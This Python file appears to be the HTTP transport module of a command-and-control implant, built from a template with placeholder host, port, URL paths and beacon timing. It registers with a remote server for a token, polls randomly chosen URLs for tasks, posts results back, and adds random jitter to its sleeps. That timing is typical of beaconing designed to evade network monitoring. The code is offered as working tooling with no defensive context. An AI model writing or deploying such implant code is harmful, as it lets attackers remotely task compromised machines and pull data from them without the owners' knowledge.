import json
import random
import time
import urllib.request

REMOTE_HOST = "REMOTE_HOST"
REMOTE_PORT = "REMOTE_PORT"
TASKS_URL_PATHS = "TASKS_URL_PATHS"
RESULTS_URL_PATHS = "RESULTS_URL_PATHS"
REGISTRATION_URL_PATH = "REGISTRATION_URL_PATH"
SLEEP_TIME = "SLEEP_TIME"
JIITER_PERCENTAGE = "JITTER_PERCENTAGE"


class Transport:
    def __init__(self):
        self.remote_host = REMOTE_HOST
        self.remote_port = REMOTE_PORT
        self.tasks_urls = [
            f"http://{self.remote_host}:{self.remote_port}{path}"
            for path in TASKS_URL_PATHS
        ]
        self.results_urls = [
            f"http://{self.remote_host}:{self.remote_port}{path}"
            for path in RESULTS_URL_PATHS
        ]
        self.registration_url = (
            f"http://{self.remote_host}:{self.remote_port}{REGISTRATION_URL_PATH}"
        )
        self.sleep_time = SLEEP_TIME
        self.jitter_percentage = JIITER_PERCENTAGE

        self._token = None

    def _jitter_sleep(self):
        time.sleep(
            self.sleep_time
            + random.uniform(0, self.jitter_percentage) * self.sleep_time,
        )

    def register(self):
        self._jitter_sleep()
        try:
            with urllib.request.urlopen(self.registration_url) as response:
                self._token = json.loads(response.read().decode("utf-8"))["token"]
            return True
        except Exception:
            return False

    def get_tasks(self):
        self._jitter_sleep()
        try:
            with urllib.request.urlopen(random.choice(self.tasks_urls)) as response:
                return json.loads(response.read().decode("utf-8"))["tasks"]
        except Exception:
            return None

    def put_results(self, results):
        self._jitter_sleep()
        try:
            with urllib.request.urlopen(
                random.choice(self.results_urls),
                json.dumps({"results": results}).encode("utf-8"),
            ) as _:
                return True
        except Exception:
            return False
